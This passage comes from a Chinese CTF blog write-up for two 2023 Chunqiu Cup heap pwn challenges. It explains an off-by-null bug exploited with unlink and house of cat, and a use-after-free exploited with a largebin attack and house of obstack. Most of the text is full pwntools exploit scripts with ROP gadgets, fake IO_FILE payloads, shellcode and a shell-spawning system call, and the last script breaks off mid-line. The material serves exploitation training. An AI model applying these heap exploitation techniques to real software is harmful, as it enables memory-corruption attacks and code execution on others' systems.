alt="image-20230711222052515"></p><p>pass加密逻辑为随机输入4个一定范围的字符，然后进行sha256加密。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711222334267.png" alt="image-20230711222334267"></p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711222313455.png" alt="image-20230711222313455"></p><p>这里，我们直接进行爆破解密即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data: <span class="hljs-built_in">str</span></span>):<br>    target_hash = data  <span class="hljs-comment"># 目标哈希值</span><br><br>    found = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>, <span class="hljs-number">91</span>):  <span class="hljs-comment"># 4 字节哈希共有 256^4 种组合</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>, <span class="hljs-number">91</span>):<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>, <span class="hljs-number">91</span>):<br>                <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>, <span class="hljs-number">91</span>):<br>                    <span class="hljs-comment"># 构造当前组合的字节串</span><br>                    attempt = <span class="hljs-built_in">bytes</span>([i, j, k, l])<br>                    <span class="hljs-comment"># 计算哈希值</span><br>                    hash_value = hashlib.sha256(attempt).digest().<span class="hljs-built_in">hex</span>()<br>                    <span class="hljs-keyword">if</span> hash_value == target_hash:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hash cracked! The original value is:&quot;</span>, attempt)<br>                        found = <span class="hljs-literal">True</span><br>                        <span class="hljs-keyword">return</span> attempt<br>                <span class="hljs-keyword">if</span> found:<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> found:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> found:<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to crack the hash.&quot;</span>)<br></code></pre></td></tr></table></figure><p>程序add存在off-by-null漏洞。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711222609346.png" alt="image-20230711222609346"></p><p>这里我们可以泄露出堆地址，直接伪造fake_chunk通过unlink检查即可，就不需要布置过于复杂的堆风水了。利用直接使用house of cat一把嗦即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./babyaul&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index: <span class="hljs-built_in">str</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, index)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, mode=<span class="hljs-number">3</span>, content=<span class="hljs-string">&#x27;l1s00t&#x27;</span></span>):<br>    menu(<span class="hljs-string">&#x27;add&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size?&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;mode?&#x27;</span>, <span class="hljs-built_in">str</span>(mode))<br>    sleep(<span class="hljs-number">0.2</span>)<br>    p.send(content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-string">&#x27;get&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-string">&#x27;del&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data: <span class="hljs-built_in">str</span></span>):<br>    target_hash = data  <span class="hljs-comment"># 目标哈希值</span><br><br>    found = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>, <span class="hljs-number">91</span>):  <span class="hljs-comment"># 4 字节哈希共有 256^4 种组合</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>, <span class="hljs-number">91</span>):<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>, <span class="hljs-number">91</span>):<br>                <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>, <span class="hljs-number">91</span>):<br>                    <span class="hljs-comment"># 构造当前组合的字节串</span><br>                    attempt = <span class="hljs-built_in">bytes</span>([i, j, k, l])<br>                    <span class="hljs-comment"># 计算哈希值</span><br>                    hash_value = hashlib.sha256(attempt).digest().<span class="hljs-built_in">hex</span>()<br>                    <span class="hljs-keyword">if</span> hash_value == target_hash:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hash cracked! The original value is:&quot;</span>, attempt)<br>                        found = <span class="hljs-literal">True</span><br>                        <span class="hljs-keyword">return</span> attempt<br>                <span class="hljs-keyword">if</span> found:<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> found:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> found:<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to crack the hash.&quot;</span>)<br><br><br>shellcode = asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">house_of_cat</span>(<span class="hljs-params">fake_IO_file_addr</span>):<br>    payload = flat(<br>        &#123;<br>            <span class="hljs-number">0x20</span>: [<br>                    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <br>                    <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,<br>                    fake_IO_file_addr+<span class="hljs-number">0x150</span>,    <span class="hljs-comment"># rdx</span><br>                    setcontext + <span class="hljs-number">61</span><br>                ],<br>            <span class="hljs-number">0x58</span>: <span class="hljs-number">0</span>,    <span class="hljs-comment"># chain</span><br>            <span class="hljs-number">0x78</span>: _IO_stdfile_2_lock,   <span class="hljs-comment"># _lock</span><br>            <span class="hljs-number">0x90</span>: fake_IO_file_addr + <span class="hljs-number">0x30</span>,  <span class="hljs-comment"># _IO_wide_data</span><br>            <span class="hljs-number">0xb0</span>: <span class="hljs-number">1</span>,    <span class="hljs-comment"># _mode</span><br>            <span class="hljs-number">0xc8</span>: _IO_wfile_jumps + <span class="hljs-number">0x30</span>,   <span class="hljs-comment"># fake_IO_wide_jumps</span><br>            <span class="hljs-number">0x100</span>: fake_IO_file_addr + <span class="hljs-number">0x40</span>,<br>            <span class="hljs-number">0x140</span>: &#123;<br>                <span class="hljs-number">0xa0</span>: [fake_IO_file_addr + <span class="hljs-number">0x210</span>, ret]<br>            &#125;,<br>            <span class="hljs-number">0x200</span>: [<br>                pop_rdi_ret, fake_IO_file_addr &gt;&gt; <span class="hljs-number">12</span> &lt;&lt; <span class="hljs-number">12</span>,<br>                pop_rsi_ret, <span class="hljs-number">0x2000</span>,<br>                pop_rdx_rbx_ret, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>,<br>                pop_rax_ret, <span class="hljs-number">10</span>,    <span class="hljs-comment"># mprotect</span><br>                syscall_ret,<br>                fake_IO_file_addr+<span class="hljs-number">0x300</span>+<span class="hljs-number">0x10</span>,<br>            ],<br>            <span class="hljs-number">0x300</span>: shellcode,<br>        &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>    )<br><br>    <span class="hljs-keyword">return</span> payload<br><br><br>menu(<span class="hljs-string">&#x27;pass&#x27;</span>)<br><br>enc = p.recvline()[:-<span class="hljs-number">1</span>].decode()<br>p.sendline(decrypt(enc))<br><br>add(<span class="hljs-number">0x500</span>)  <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x500</span>)  <span class="hljs-comment"># 1</span><br><br>delete(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0x520</span>)  <span class="hljs-comment"># 0</span><br><br>add(<span class="hljs-number">0x500</span>, <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">16</span>)      <span class="hljs-comment"># 2</span><br>show(<span class="hljs-number">2</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;heap&#x27;</span>, heap_base)<br><br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x500</span>, <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">8</span>)     <span class="hljs-comment"># 2</span><br>show(<span class="hljs-number">2</span>)<br><br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ecbe0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>_IO_list_all = libc_base + <span class="hljs-number">0x1ed5a0</span><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>_IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x1ee7f0</span><br>_IO_wfile_jumps = libc_base + <span class="hljs-number">0x1e8f60</span><br><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x0000000000023b6a</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x000000000002601f</span><br>pop_rdx_rbx_ret = libc_base + <span class="hljs-number">0x000000000015f8c6</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x0000000000036174</span><br>syscall_ret = libc_base + <span class="hljs-number">0x00000000000630a9</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><br><br>fake_chunk = heap_base + <span class="hljs-number">0xf70</span><br>fake_size = <span class="hljs-number">0x600</span><br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0x10</span>: [<span class="hljs-number">0</span>, fake_size, fake_chunk, fake_chunk],<br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>)<br><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-number">2</span>)   <span class="hljs-comment"># 3     no-use</span><br><br>add(<span class="hljs-number">0x500</span>, <span class="hljs-number">3</span>, payload)  <span class="hljs-comment"># 4</span><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-number">2</span>)  <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x4f8</span>)  <span class="hljs-comment"># 6</span><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-number">2</span>)   <span class="hljs-comment"># 7</span><br><br>delete(<span class="hljs-number">5</span>)<br>add(<span class="hljs-number">0x108</span>, <span class="hljs-number">1</span>, flat(&#123;<span class="hljs-number">0x100</span>: fake_size&#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span>))  <span class="hljs-comment"># 5 off-by-null</span><br><br>delete(<span class="hljs-number">6</span>)   <span class="hljs-comment"># trigger</span><br><br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">5</span>)<br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0</span>: house_of_cat(fake_chunk),<br>        <span class="hljs-number">0x4e0</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0x111</span>, p64(_IO_list_all)]<br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>)<br>add(<span class="hljs-number">0x520</span>, <span class="hljs-number">3</span>, payload)<br><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x100</span>, <span class="hljs-number">2</span>, p64(fake_chunk))<br><br><span class="hljs-comment"># dbg()</span><br><br>menu(<span class="hljs-string">&#x27;exit&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711222838284.png" alt="image-20230711222838284"></p><h2 id="three-boy"><a href="#three-boy" class="headerlink" title="three-boy"></a>three-boy</h2><p>检查保护。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711210008159.png" alt="image-20230711210008159"></p><p>保护全开。</p><p>这道题仍然是一道常规的堆菜单题。</p><p><code>sub_17C1</code>函数根据随机数分配堆块。这里为了使我们分配的堆块可控，笔者使用python模拟rand随机数。<img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711210238126.png" alt="image-20230711210238126"></p><p><code>sub_16AA</code>函数存在<strong>UAF</strong>漏洞。</p><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711205905435.png" alt="image-20230711205905435"></p><p>还可以edit堆块一次以及show堆块一次。</p><p>大致思路就是泄露heap以及libc地址，分配比较大的chunk，然后剩下的堆块从这个大的chunk中分割，即可利用一次edit进行largebin attack以及伪造IO file。</p><p>笔者这里采用house of obstack的方式获取shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.35.so&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myadd</span>(<span class="hljs-params">index, size, select</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;area to explore: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;explore this time: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;(1: yes / 0: no)&#x27;</span>, <span class="hljs-built_in">str</span>(select))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    flag = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> flag:<br>        <span class="hljs-keyword">if</span> fun.rand() % <span class="hljs-number">10</span> &gt; <span class="hljs-number">4</span>:<br>            myadd(index, size, <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">else</span>:<br>            flag = <span class="hljs-number">0</span><br>            myadd(index, size, <span class="hljs-number">0</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;signal from the Trisolarans: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, size, content</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;area to talk to: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;words you want to send: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;write down your conclusions: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;abandon to return: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">house_of_obstack</span>(<span class="hljs-params">fake_IO_file_addr</span>):<br>    fake_IO_file = flat(<br>        &#123;<br>            <span class="hljs-number">0x8</span>: <span class="hljs-number">1</span>,<span class="hljs-comment"># next_free</span><br>            <span class="hljs-number">0x10</span>: <span class="hljs-number">0</span>,<span class="hljs-comment"># chunk_limit</span><br>            <span class="hljs-number">0x18</span>: <span class="hljs-number">1</span>,<span class="hljs-comment"># _IO_write_ptr</span><br>            <span class="hljs-number">0x20</span>: <span class="hljs-number">0</span>,<span class="hljs-comment"># _IO_write_end</span><br>            <span class="hljs-number">0x28</span>: system,<span class="hljs-comment"># gadget</span><br>            <span class="hljs-number">0x38</span>: fake_IO_file_addr + <span class="hljs-number">0xe8</span>,<span class="hljs-comment"># rdi = &amp;&#x27;/bin/sh\x00&#x27;</span><br>            <span class="hljs-number">0x40</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-number">0x58</span>: <span class="hljs-number">0</span>,<span class="hljs-comment"># chain</span><br>            <span class="hljs-number">0x78</span>: _IO_stdfile_2_lock,<span class="hljs-comment"># _IO_stdfile_1_lock</span><br>            <span class="hljs-number">0x90</span>: _IO_wide_data,<span class="hljs-comment"># _IO_wide_data_2</span><br>            <span class="hljs-number">0xc8</span>: _IO_obstack_jumps + <span class="hljs-number">0x20</span>,<br>            <span class="hljs-number">0xd0</span>: fake_IO_file_addr,    <span class="hljs-comment"># obstack(B)</span><br>            <span class="hljs-number">0xd8</span>: <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>        &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>    )<br>    payload = fake_IO_file<br>    <br>    <span class="hljs-keyword">return</span> payload<br>    <br><br>fun = cdll.LoadLibrary(<span class="hljs-string">&#x27;./libc-2.35.so&#x27;</span>)<br>fun.srand(((fun.time(<span class="hljs-number">0</span>) &amp; <span class="hljs-number">0xffffffff</span>) // <span class="hljs-number">100</span>) * <span class="hljs-number">100</span>)<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x520</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x500</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">2</span>)<br><br>show(<span class="hljs-number">0</span>)<br><br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span 